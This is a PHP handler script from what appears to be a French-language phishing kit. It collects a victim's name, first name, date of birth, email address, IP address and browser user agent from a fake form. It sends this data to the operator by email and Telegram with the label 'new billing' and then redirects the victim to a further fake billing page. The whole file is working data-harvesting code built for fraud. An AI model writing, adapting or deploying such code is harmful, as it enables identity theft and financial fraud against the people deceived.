<?php
include '../../settings.php';
include '../core/funcs.php';
session_start();

if (isset($_POST['name'],$_POST['dob'],$_POST['email'])) {
    $_SESSION['name'] = $_POST['name'];
    $_SESSION['fname'] = $_POST['prenom'];
    $_SESSION['dob'] = $_POST['dob'];
    $_SESSION['email'] = $_POST['email'];
    $message = "≡≡≡≡≡≡≡≡ ☫🪪☫ ≡≡≡≡≡≡≡≡
      
👮🏼‍♂️ Nom : ".$_SESSION['name']."
🛠 Prénom : ".$_SESSION['fname']."
👨🏼‍⚕️ Date de naissance : ".$_SESSION['dob']."
📧 Email : ".$_SESSION['email']."
      
≡≡≡≡≡≡≡≡ ☫📶☫ ≡≡≡≡≡≡≡≡
      
📍 Adresse IP : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent :" . $_SERVER['HTTP_USER_AGENT'];
    update('informations');
    sendMailRez($email,"🪪 + 1 Nouveaux billing : [".$_SESSION['name']."] 🪪",$message);
    sendTelegramRez($message, False);
    header('location: ../loading.php?page=billing.php');
}